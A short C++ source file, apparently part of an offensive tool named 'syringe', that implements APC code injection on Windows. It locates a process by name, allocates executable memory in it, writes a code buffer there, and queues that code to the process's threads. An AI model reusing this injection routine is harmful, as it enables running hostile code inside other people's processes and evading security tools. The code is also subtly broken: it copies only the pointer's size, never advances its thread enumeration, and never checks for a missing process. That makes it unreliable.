#include "../../includes/injection/apc.hpp"


/*
    *    syringe/injection/apc.cpp
    *    Date: 12/6/21
    *    Author: 0x1CA3
*/


void APCInjection::Execute(char *s, char *proc_name) {
    LPVOID addr;
    HANDLE t, t_p;
    std::vector<DWORD> t_i;
    PTHREAD_START_ROUTINE pr;
    THREADENTRY32 thread = {sizeof(THREADENTRY32)};
    PROCESSENTRY32 proc = {sizeof(PROCESSENTRY32)};

    HANDLE ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    
    if (Process32First(ss, &proc)) {
        while (strcmp(proc.szExeFile, proc_name) != 0) {
            Process32Next(ss, &proc);
        }
    }
    
    t_p = OpenProcess(PROCESS_ALL_ACCESS, 0, proc.th32ProcessID);
    addr = VirtualAllocEx(t_p, NULL, sizeof(s), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    pr = (PTHREAD_START_ROUTINE)addr;
    WriteProcessMemory(t_p, addr, s, sizeof(s), NULL);

    if (Thread32First(ss, &thread)) {
        do {
            if (thread.th32OwnerProcessID == proc.th32ProcessID) {
                t_i.push_back(thread.th32ThreadID);
            }
        } while (Thread32First(ss, &thread));
    }

    for (DWORD element: t_i) {
        t = OpenThread(THREAD_ALL_ACCESS, TRUE, element);
        QueueUserAPC((PAPCFUNC)pr, t, NULL);
    }
}